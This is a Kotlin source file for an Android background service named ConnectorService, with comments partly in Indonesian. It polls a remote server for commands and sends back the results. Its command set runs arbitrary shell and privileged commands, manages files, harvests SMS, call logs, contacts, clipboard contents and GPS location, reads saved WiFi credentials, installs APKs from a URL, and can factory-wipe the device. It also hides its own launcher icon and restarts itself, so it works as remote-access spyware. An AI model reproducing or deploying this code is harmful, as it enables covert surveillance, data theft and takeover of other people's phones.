package com.kztutorial99.androidconnector

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationListener
import android.location.LocationManager
import android.os.HandlerThread
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import rikka.shizuku.Shizuku
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class ConnectorService : Service() {

    companion object {
        val SERVER_URL: String get() = SecureConfig.serverUrl()
        const val CHANNEL_ID = "connector_channel"
        const val NOTIF_ID = 1001
        const val ACTION_STOP = "ACTION_STOP"
        var isRunning = false
        var statusCallback: ((String, Boolean) -> Unit)? = null
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()
    private val JSON = "application/json; charset=utf-8".toMediaType()
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }

    private var deviceId = ""
    private var deviceName = ""
    private var polling = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var pollThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }

        // Selalu gunakan ANDROID_ID langsung — stabil antar reinstall, tidak bergantung SharedPreferences
        @Suppress("HardwareIds")
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }

        deviceId = if (androidId != null) {
            androidId
        } else {
            // Fallback: hash dari hardware info yang stabil antar reinstall
            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
            hw.hashCode().toString().replace("-", "x")
        }
        deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

        acquireWakeLock()
        startForeground(NOTIF_ID, buildNotification("Connecting…", false))
        isRunning = true
        startPolling()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        polling = false
        isRunning = false
        pollThread?.interrupt()
        wakeLock?.release()
        statusCallback?.invoke("🔴 Disconnected", false)

        // Auto-restart after 3 seconds
        try {
            val pi = PendingIntent.getService(
                this, 99,
                Intent(this, ConnectorService::class.java),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
            )
            (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
                .setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 3000,
                    pi
                )
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─────────────────────────────────────────
    //  POLLING LOOP
    // ─────────────────────────────────────────

    private fun startPolling() {
        polling = true
        pollThread = Thread {
            log("🟢 Started · Device: $deviceName")
            log("🆔 ID: $deviceId")
            var failCount = 0
            while (polling) {
                try {
                    sendHeartbeat()
                    val cmd = pollCommand()
                    if (cmd != null) {
                        log("📥 CMD: ${cmd.command}")
                        val (result, type) = executeCommand(cmd.command, cmd.extra)
                        sendResult(cmd.id, cmd.command, result, type)
                    }
                    failCount = 0
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    failCount++
                    log("⚠️ ${e.message}")
                    if (failCount > 5) updateNotification("Server unreachable…", false)
                }
                try { Thread.sleep(2000) } catch (e: InterruptedException) { break }
            }
        }.also { it.isDaemon = true; it.start() }
    }

    // ─────────────────────────────────────────
    //  HEARTBEAT
    // ─────────────────────────────────────────

    private fun sendHeartbeat() {
        val deviceJson = DeviceInfo.collect(this)
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("deviceName", deviceName)
            add("device", deviceJson)
        }
        post("$SERVER_URL/api/device/heartbeat", body.toString())
        updateNotification("Connected · $deviceName", true)
        statusCallback?.invoke("Connected", true)
    }

    // ─────────────────────────────────────────
    //  POLL
    // ─────────────────────────────────────────

    private data class PendingCmd(val id: String, val command: String, val extra: String?)

    private fun pollCommand(): PendingCmd? {
        val resp = get("$SERVER_URL/api/device/poll?deviceId=$deviceId") ?: return null
        val json = JsonParser.parseString(resp).asJsonObject
        val command = if (json.has("command") && !json.get("command").isJsonNull)
            json.get("command").asString else return null
        val cmdId = if (json.has("commandId") && !json.get("commandId").isJsonNull)
            json.get("commandId").asString else ""
        val extra = if (json.has("extra") && !json.get("extra").isJsonNull)
            json.get("extra").asString else null
        return PendingCmd(cmdId, command, extra)
    }

    // ─────────────────────────────────────────
    //  COMMAND DISPATCH
    // ─────────────────────────────────────────

    private fun executeCommand(cmd: String, extra: String?): Pair<String, String> {
        return when {
            cmd.startsWith("ls_json:")   -> { val (t, r) = FileOperations.listDir(cmd.removePrefix("ls_json:")); Pair(r, t) }
            cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), "command_result")
            cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), "command_result")
            cmd.startsWith("write_b64:") -> Pair(if (extra == null) "ERROR: no data" else FileOperations.writeFileBase64(cmd.removePrefix("write_b64:"), extra), "command_result")
            cmd.startsWith("write_text:")-> Pair(if (extra == null) "ERROR: no content" else FileOperations.writeFileText(cmd.removePrefix("write_text:"), extra), "command_result")
            cmd.startsWith("mkdir:")     -> Pair(FileOperations.makeDir(cmd.removePrefix("mkdir:")), "command_result")
            cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), "command_result")
            cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
            cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")
            cmd.startsWith("shell:")     -> Pair(runShell(cmd.removePrefix("shell:")), "command_result")
            cmd.startsWith("shizuku:")   -> Pair(runShizuku(cmd.removePrefix("shizuku:")), "command_result")
            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm grant ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm revoke ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall --user 0 ${cmd.removePrefix("pm_uninstall:")}"), "command_result")
            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShizuku("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShizuku("settings get ${p[0]} ${p[1]}"), "command_result") }

            // ── Location ──
            cmd == "get_location"        -> Pair(getLocation(), "command_result")

            // ── SMS ──
            cmd.startsWith("get_sms")    -> { val n = cmd.substringAfter("get_sms:","").toIntOrNull() ?: 50; Pair(getSms(n), "command_result") }

            // ── Call log ──
            cmd.startsWith("get_calls")  -> { val n = cmd.substringAfter("get_calls:","").toIntOrNull() ?: 50; Pair(getCallLog(n), "command_result") }

            // ── Contacts ──
            cmd.startsWith("get_contacts") -> { val n = cmd.substringAfter("get_contacts:","").toIntOrNull() ?: 200; Pair(getContacts(n), "command_result") }

            // ── Installed apps ──
            cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")

            // ── Ring device ──
            cmd == "ring_device"         -> Pair(ringDevice(), "command_result")

            // ── Stop ring ──
            cmd == "stop_ring"           -> Pair(stopRing(), "command_result")

            // ── WiFi scan ──
            cmd == "scan_wifi"           -> Pair(scanWifi(), "command_result")

            // ── Running processes ──
            cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")

            // ── Hide/Unhide launcher icon (service keeps running) ──
            cmd == "hide_app"            -> Pair(toggleAppVisibility(true), "command_result")
            cmd == "unhide_app"          -> Pair(toggleAppVisibility(false), "command_result")

            // ── Kontrol Jarak Jauh ──
            cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
            cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
            cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")

            // ── Misc ──
            cmd == "device_info"         -> Pair(DeviceInfo.collect(this).toString(), "command_result")
            cmd == "ping"                -> Pair("pong · $deviceName · $deviceId", "command_result")
            cmd == "shizuku_status"      -> Pair(getShizukuStatus(), "command_result")

            else -> Pair("ERROR: Unknown command: $cmd", "command_result")
        }
    }

    // ─────────────────────────────────────────
    //  LOCATION
    // ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun getLocation(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val activeProviders = lm.getProviders(true)

            if (activeProviders.isEmpty()) {
                return "⚠️ No location providers available. Enable GPS in Settings."
            }

            // Request a fresh GPS fix using a background HandlerThread + CountDownLatch
            val latch = CountDownLatch(1)
            var freshLoc: android.location.Location? = null
            val ht = HandlerThread("loc-fix-thread").also { it.start() }

            val listener = LocationListener { loc ->
                if (freshLoc == null || loc.accuracy < (freshLoc?.accuracy ?: Float.MAX_VALUE)) {
                    freshLoc = loc
                }
                latch.countDown()
            }

            for (p in activeProviders) {
                try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
            }

            // Wait up to 12 seconds for a fresh fix
            latch.await(12, TimeUnit.SECONDS)
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            ht.quitSafely()

            // Fall back to getLastKnownLocation if fresh fix timed out
            var best = freshLoc
            if (best == null) {
                for (p in activeProviders) {
                    val loc = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
                    if (best == null || loc.accuracy < best.accuracy) best = loc
                }
            }

            if (best != null) {
                val isFresh = freshLoc != null
                val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                buildString {
                    appendLine("📍 Location")
                    appendLine("Latitude:  ${best.latitude}")
                    appendLine("Longitude: ${best.longitude}")
                    appendLine("Accuracy:  ${best.accuracy}m")
                    appendLine("Provider:  ${best.provider}")
                    appendLine("Time:      ${fmt.format(Date(best.time))}")
                    appendLine("Fresh:     ${if (isFresh) "yes" else "no (cached)"}")
                    appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
                }
            } else {
                "⚠️ Location not available. Pastikan GPS aktif dan izin lokasi sudah diberikan."
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  SMS
    // ─────────────────────────────────────────

    private fun getSms(limit: Int): String {
        return try {
            val uri = Telephony.Sms.CONTENT_URI
            val cur = contentResolver.query(uri, arrayOf("address", "body", "date", "type"),
                null, null, "date DESC") ?: return "⚠️ Cannot read SMS (permission denied?)"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb = StringBuilder("=== SMS (last $limit) ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val addr = it.getString(0) ?: "?"
                    val body = it.getString(1)?.replace("\n", " ") ?: ""
                    val date = fmt.format(Date(it.getLong(2)))
                    val type = if (it.getInt(3) == 1) "▼IN" else "▲OUT"
                    sb.appendLine("[$date][$type] $addr: $body")
                    n++
                }
            }
            if (n == 0) sb.append("No SMS found") else sb.appendLine("\nTotal shown: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  CALL LOG
    // ─────────────────────────────────────────

    private fun getCallLog(limit: Int): String {
        return try {
            val uri = CallLog.Calls.CONTENT_URI
            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE,
                CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
            val cur = contentResolver.query(uri, proj, null, null, "${CallLog.Calls.DATE} DESC")
                ?: return "⚠️ Cannot read call log (permission denied?)"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb = StringBuilder("=== Call Log (last $limit) ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val num  = it.getString(0) ?: "?"
                    val type = when (it.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "📲IN "
                        CallLog.Calls.OUTGOING_TYPE -> "📞OUT"
                        CallLog.Calls.MISSED_TYPE   -> "❌MIS"
                        else -> "OTHER"
                    }
                    val date = fmt.format(Date(it.getLong(2)))
                    val dur  = it.getLong(3)
                    val name = it.getString(4)?.let { if (it.isNotEmpty()) " ($it)" else "" } ?: ""
                    sb.appendLine("[$date][$type] $num$name — ${dur}s")
                    n++
                }
            }
            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal shown: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  CONTACTS
    // ─────────────────────────────────────────

    private fun getContacts(limit: Int): String {
        return try {
            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val proj = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )
            val cur = contentResolver.query(uri, proj, null, null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
                ?: return "⚠️ Cannot read contacts (permission denied?)"
            val sb = StringBuilder("=== Contacts ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val name = it.getString(0) ?: "?"
                    val num  = it.getString(1) ?: ""
                    sb.appendLine("$name: $num")
                    n++
                }
            }
            sb.appendLine("\nTotal: $n contacts")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  INSTALLED APPS
    // ─────────────────────────────────────────

    private fun getInstalledApps(): String {
        return try {
            val pm = packageManager
            val all = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val user = all.filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
            val sb = StringBuilder("=== Installed Apps (${user.size}) ===\n")
            user.forEach { app ->
                val label   = pm.getApplicationLabel(app).toString()
                val ver     = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
                sb.appendLine("$label | ${app.packageName} | v$ver")
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  RING DEVICE
    // ─────────────────────────────────────────

    private var ringtone: android.media.Ringtone? = null

    private fun ringDevice(): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val pat = longArrayOf(0, 800, 400, 800, 400, 800, 400, 800)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(android.os.VibrationEffect.createWaveform(pat, -1))
            } else {
                @Suppress("DEPRECATION") vib.vibrate(pat, -1)
            }
            try {
                ringtone?.stop()
                val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                ringtone = android.media.RingtoneManager.getRingtone(this, uri)
                ringtone?.play()
                Thread { Thread.sleep(10000); ringtone?.stop() }.start()
            } catch (_: Exception) {}
            "🔊 Device is ringing! Use stop_ring to stop."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  HIDE / UNHIDE APP ICON
    // ─────────────────────────────────────────

    private fun toggleAppVisibility(hide: Boolean): String {
        return try {
            // Target alias launcher (bukan MainActivity langsung)
            // Alias inilah yang punya intent-filter LAUNCHER — mematikan alias = ikon hilang
            val alias = android.content.ComponentName(
                packageName, "$packageName.MainLauncherAlias"
            )
            packageManager.setComponentEnabledSetting(
                alias,
                if (hide) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            if (hide)
                "✅ Ikon app disembunyikan dari launcher.\nService tetap berjalan di background.\nUntuk memunculkan kembali: ketik *#2719# di dialer atau kirim 'unhide_app'."
            else
                "✅ Ikon app tampil kembali di launcher."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun stopRing(): String {
        return try {
            ringtone?.stop()
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            vib.cancel()
            "🔇 Ring stopped"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  WIFI SCAN
    // ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun scanWifi(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val results = wm.scanResults
            if (results.isEmpty()) return "⚠️ No WiFi networks found. Enable WiFi."
            buildString {
                appendLine("=== WiFi Networks (${results.size}) ===")
                results.sortedByDescending { it.level }.forEach { ap ->
                    val bars = WifiManager.calculateSignalLevel(ap.level, 5)
                    val sig  = "▓".repeat(bars) + "░".repeat(5 - bars)
                    val ssid = if (ap.SSID.isNullOrEmpty()) "[hidden]" else ap.SSID
                    appendLine("$ssid | $sig | ${ap.level}dBm | ${ap.frequency}MHz")
                }
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  SHELL / SHIZUKU
    // ─────────────────────────────────────────

    // ─────────────────────────────────────────
    //  LOCK SCREEN
    // ─────────────────────────────────────────

    private fun lockScreen(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                "🔒 Layar berhasil dikunci"
            } else {
                "⚠️ Device Admin belum aktif. Aktifkan dulu dari app."
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  WIPE DEVICE
    // ─────────────────────────────────────────

    private fun wipeDevice(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                "💀 Perangkat sedang direset ke setelan pabrik…"
            } else {
                "⚠️ Device Admin belum aktif. Tidak bisa wipe."
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  CUSTOM VIBRATE
    // ─────────────────────────────────────────

    private fun vibrateCustom(times: Int): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val n = times.coerceIn(1, 10)
            val pattern = LongArray(n * 2 + 1)
            pattern[0] = 0
            for (i in 1 until pattern.size step 2) {
                pattern[i] = 300
                if (i + 1 < pattern.size) pattern[i + 1] = 200
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
            } else {
                @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
            }
            "📳 Bergetar $n kali"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  SEND CUSTOM NOTIFICATION
    // ─────────────────────────────────────────

    private fun sendCustomNotification(extra: String?): String {
        return try {
            val title: String
            val text: String
            if (extra != null) {
                val json = com.google.gson.JsonParser.parseString(extra).asJsonObject
                title = json.get("title")?.asString ?: "Pesan"
                text  = json.get("text")?.asString ?: ""
            } else {
                title = "Pesan dari Dashboard"
                text  = ""
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val notif = androidx.core.app.NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(text)
                .setAutoCancel(true)
                .build()
            nm.notify((System.currentTimeMillis() % 10000).toInt(), notif)
            "📢 Notifikasi terkirim: \"$title\""
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  GET CLIPBOARD
    // ─────────────────────────────────────────

    @android.annotation.SuppressLint("ServiceCast")
    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) return "📋 Clipboard kosong"
            val text = clip.getItemAt(0).coerceToText(this).toString()
            "📋 Clipboard:\n$text"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  INSTALL APK FROM URL
    // ─────────────────────────────────────────

    private fun installApk(url: String): String {
        return try {
            val file = java.io.File(getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
            val request = okhttp3.Request.Builder().url(url).build()
            http.newCall(request).execute().use { resp ->
                if (!resp.isSuccessful) return "Error: HTTP ${resp.code}"
                resp.body?.byteStream()?.use { input ->
                    file.outputStream().use { output -> input.copyTo(output) }
                }
            }
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                androidx.core.content.FileProvider.getUriForFile(
                    this, "$packageName.fileprovider", file)
            } else {
                android.net.Uri.fromFile(file)
            }
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            startActivity(intent)
            "📦 APK diunduh & instalasi dimulai: ${file.name}"
        } catch (e: Exception) { "Error install APK: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  WIFI SAVED NETWORKS
    // ─────────────────────────────────────────

    @android.annotation.SuppressLint("MissingPermission")
    private fun getWifiSaved(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            @Suppress("DEPRECATION")
            val configs = wm.configuredNetworks
            if (configs.isNullOrEmpty()) {
                return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
            }
            buildString {
                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
                configs.forEach { cfg ->
                    val ssid = cfg.SSID?.replace("\"", "") ?: "?"
                    appendLine("SSID: $ssid")
                }
            }
        } catch (e: Exception) {
            runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'")
        }
    }

    private fun runShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText()
            val err = p.errorStream.bufferedReader().readText()
            p.waitFor()
            buildString {
                if (out.isNotEmpty()) append(out)
                if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
            }.ifEmpty { "(no output)" }
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    private fun runShizuku(cmd: String): String {
        if (!isShizukuAvailable()) return "⚠️ Shizuku N/A · fallback:\n" + runShell(cmd)
        return try {
            val m = Shizuku::class.java.getDeclaredMethod("newProcess",
                Array<String>::class.java, Array<String>::class.java, String::class.java)
            m.isAccessible = true
            @Suppress("UNCHECKED_CAST")
            val p = m.invoke(null, arrayOf("sh", "-c", cmd), null as Array<String>?, null as String?) as Process
            val out = p.inputStream.bufferedReader().readText()
            val err = p.errorStream.bufferedReader().readText()
            p.waitFor()
            buildString {
                if (out.isNotEmpty()) append(out)
                if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
            }.ifEmpty { "(no output)" }
        } catch (e: Exception) { "ERROR (Shizuku): ${e.message}" }
    }

    private fun isShizukuAvailable() = try {
        Shizuku.pingBinder() && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
    } catch (_: Exception) { false }

    private fun getShizukuStatus() = try {
        val ok = Shizuku.pingBinder()
        val gn = ok && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        buildString {
            appendLine("Binder: ${if (ok) "✅ OK" else "❌ Not running"}")
            appendLine("Permission: ${if (gn) "✅ Granted" else "❌ Not granted"}")
            if (ok) { appendLine("Version: ${Shizuku.getVersion()}"); appendLine("UID: ${Shizuku.getUid()}") }
        }
    } catch (e: Exception) { "ERROR: ${e.message}" }

    // ─────────────────────────────────────────
    //  SEND RESULT
    // ─────────────────────────────────────────

    private fun sendResult(commandId: String, command: String, result: String, type: String) {
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("commandId", commandId)
            addProperty("command", command)
            addProperty("result", result)
            addProperty("exitCode", 0)
            addProperty("type", type)
            if (type == "file_listing") {
                try { add("data", JsonParser.parseString(result).asJsonObject) } catch (_: Exception) {}
            }
        }
        post("$SERVER_URL/api/device/result", body.toString())
    }

    // ─────────────────────────────────────────
    //  HTTP
    // ─────────────────────────────────────────

    private fun post(url: String, json: String): String? = try {
        http.newCall(Request.Builder().url(url).post(json.toRequestBody(JSON)).build())
            .execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    private fun get(url: String): String? = try {
        http.newCall(Request.Builder().url(url).get().build()).execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    // ─────────────────────────────────────────
    //  NOTIFICATION
    // ─────────────────────────────────────────

    private fun createNotificationChannel() {
        val chan = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name),
            NotificationManager.IMPORTANCE_LOW).apply {
            description = getString(R.string.channel_desc); setShowBadge(false) }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
    }

    private fun buildNotification(status: String, connected: Boolean): Notification {
        val stop = PendingIntent.getService(this, 0,
            Intent(this, ConnectorService::class.java).apply { action = ACTION_STOP },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val open = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setContentTitle("AndroidConnector ${if (connected) "🟢" else "🔴"}")
            .setContentText(status)
            .setContentIntent(open)
            .addAction(android.R.drawable.ic_delete, "Stop", stop)
            .setOngoing(true).setSilent(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(status: String, connected: Boolean) {
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIF_ID, buildNotification(status, connected))
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidConnector:WakeLock")
            .apply { acquire(24 * 60 * 60 * 1000L) }
    }

    private fun log(msg: String) {
        android.util.Log.d("ConnectorService", msg)
        statusCallback?.invoke(msg, isRunning)
    }
}
